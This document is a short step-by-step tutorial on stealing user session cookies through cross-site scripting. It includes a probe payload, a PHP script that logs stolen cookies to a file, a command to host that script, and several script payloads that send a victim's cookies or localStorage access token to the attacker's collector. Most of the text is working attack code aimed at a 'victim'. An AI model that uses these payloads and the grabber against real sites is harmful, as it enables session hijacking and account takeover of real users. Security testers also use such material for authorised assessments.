**Steal Cookies via XSS**
Here we can resume how we could steal a user session cookie via XSS.
Let's take in account a possible scenario where people have several forms into a profile.

To perform this we can example:
1)Check the XSS vulnerability by sending some xss like
```
<img src=x onerror=confirm(1)>
```

2)Next we can check for **HTTPOnly** cookie via F12(DevOptions in browser) if **Http-Only=off** then we can continue otherwise no

3)Save as **cookie.php**
```
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

4)Host on your PHP server
```
php -S 0.0.0.0:80
```

5)Send the XSS to the victim
```
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
OR
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
OR
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
OR
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```
